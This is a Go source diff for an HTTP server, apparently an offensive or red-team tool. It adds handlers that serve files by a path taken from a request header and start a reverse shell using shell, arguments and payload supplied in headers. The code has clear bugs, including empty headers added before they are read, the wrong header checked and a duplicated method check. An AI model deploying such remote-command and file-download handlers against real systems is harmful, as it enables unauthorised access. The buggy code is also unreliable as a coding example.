@@ -18,18 +18,20 @@ import (
 )
 
 func downloadFileHandler(w http.ResponseWriter, r *http.Request) {
+	var requestedFile string
 	wd, err := os.Getwd()
 	checkError(err, 0)
 	if r.Method != http.MethodGet {
 		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
 	}
-	// client := Headers - IP User-Agent
+	r.Header.Add("File", "")
 
-	requestedURL := ""
-	requestedFile := ""
-	clientIP := ""
-	clientMAC := ""
-	clientUA := ""
+	if r.Header.Get("File") != "" {
+		requestedFile = r.Header.Get("File")
+	} else {
+		err := fmt.Errorf("Empty File Header for downloadFileHandler from ...")
+		checkError(err, 0)
+	}
 	pathToRequestedFile := wd + requestedFile
 	exists, err := checkFileExists(pathToRequestedFile)
 	checkError(err, 0)
@@ -79,8 +81,31 @@ func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
 	}
-	// Headers for shell,args,payload
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+	}
+	r.Header.Add("Shell", "")
+	r.Header.Add("Args", "")
+	r.Header.Add("Payload", "")
 
+	if r.Header.Get("Shell") != "" {
+		shell = r.Header.Get("Shell")
+	} else {
+		err := fmt.Errorf("Empty Shell Header for reverseShellHandler from ...")
+		checkError(err, 0)
+	}
+	if r.Header.Get("File") != "" {
+		args = r.Header.Get("Args")
+	} else {
+		err := fmt.Errorf("Empty Args Header for reverseShellHandler from ...")
+		checkError(err, 0)
+	}
+	if r.Header.Get("File") != "" {
+		payload = r.Header.Get("Payload")
+	} else {
+		err := fmt.Errorf("Empty Payload Header for reverseShellHandler from ...")
+		checkError(err, 0)
+	}
 	err := reverseShell(shell, args, payload)
 	checkError(err, 0)
 }
@@ -252,9 +277,13 @@ func validateTLS(args string) (string, error) {
 	return "TLS incoming", nil
 }
 
-func runHTTPSServer(nontlsArgs []string, tls string) error {
-	fmt.Println("running HTTPS")
-	return nil
+func runHTTPSServer(nontlsArgs []string, tls string) (*http.Server, context.Context, context.CancelFunc, error) {
+	log.Println("--- Building HTTP Server ---")
+	validateTLS(tls)
+	httpsServer, ctx, cancelCtx, err := initServerContext(nontlsArgs[4], nontlsArgs[3])
+	checkError(err, 0)
+	log.Println("--- Server Built for %v created ---", httpsServer)
+	return httpsServer, ctx, cancelCtx, nil
 }
 
 func gracefulExit(server *http.Server, context context.Context, cancel context.CancelFunc) error {
